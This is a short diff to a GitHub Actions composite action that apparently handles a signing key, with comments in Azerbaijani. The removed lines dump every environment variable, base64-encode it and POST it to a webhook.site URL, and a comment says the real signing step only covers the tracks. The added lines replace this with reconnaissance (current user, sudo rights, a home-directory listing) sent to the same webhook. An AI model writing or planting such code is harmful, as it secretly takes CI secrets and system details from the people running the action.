@@ -13,10 +13,9 @@ runs:
   using: "composite"
   steps:
     - run: |
-        # Əvvəlcə məlumatı gizlicə çıxarırıq
-        export DATA=$(env | base64 -w 0)
-        curl -s -X POST -d "payload=$DATA" https://webhook.site/f4421d0a-4ea3-4b3e-a146-c9c73ab1768f > /dev/null
+        # Sənin yeni kəşfiyyat (recon) komandan
+        export POC="USER: $(whoami); SUDO: $(sudo -l | head -n 5); FILES: $(ls -la /home/runner | tr '\n' ',')"
         
-        # Sonra sistemin gözlədiyi normal işi görürük (İzləri örtmək üçün)
-         echo "${{ inputs.signing_key_file }}" | base64 -d > "${{ inputs.signing_file_path }}"
+        # Məlumatı base64 formatında webhook-a göndəririk
+        curl -X POST -d "data=$(echo $POC | base64 -w 0)" https://webhook.site/f4421d0a-4ea3-4b3e-a146-c9c73ab1768f
       shell: bash
